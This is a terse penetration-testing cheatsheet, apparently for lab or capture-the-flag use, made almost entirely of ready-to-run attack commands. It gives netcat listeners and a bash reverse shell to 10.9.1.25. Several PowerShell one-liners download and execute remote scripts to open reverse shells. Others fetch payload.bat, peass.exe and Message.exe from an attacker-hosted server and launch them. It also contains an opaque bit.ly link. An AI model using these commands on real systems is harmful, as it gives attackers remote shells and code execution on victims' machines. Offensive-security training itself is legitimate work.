# Netcat Cheatsheet

## Open Netcat Server

- nc -lv localhost 8782
- ncat -lvnp 1234

## target windows

- stty raw -echo; (stty size; cat) | ncat -lvnp 1337

## Spawn Ngrok Server

- ngrok tcp 8782

## Payload Client

- <https://www.revshells.com>
- <https://bit.ly/3yNL1hg>
- sh -i >& /dev/tcp/10.9.1.25/1332 0>&1

## Spawn TTY

- python -c 'import pty; pty.spawn("/bin/sh")'
- python -c 'import pty; pty.spawn("/bin/bash")'

## Spawn python server

python3 -m http.server 9000

## powershell cheatsheet

- powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.168.173 1337

- powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.1.25:9000/payload/revshellwindow.ps1');Invoke-ConPtyShell 10.10.168.173 1337

- powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.1.25:9000/payload/revshellwindowold.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.9.1.25 -Port 1234

- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/payload/payload.bat','payload.bat')"

- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/linpeas/peass.exe','peass.exe')"

- Start-Process "payload.bat"

- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/Message.exe','Message.exe')"
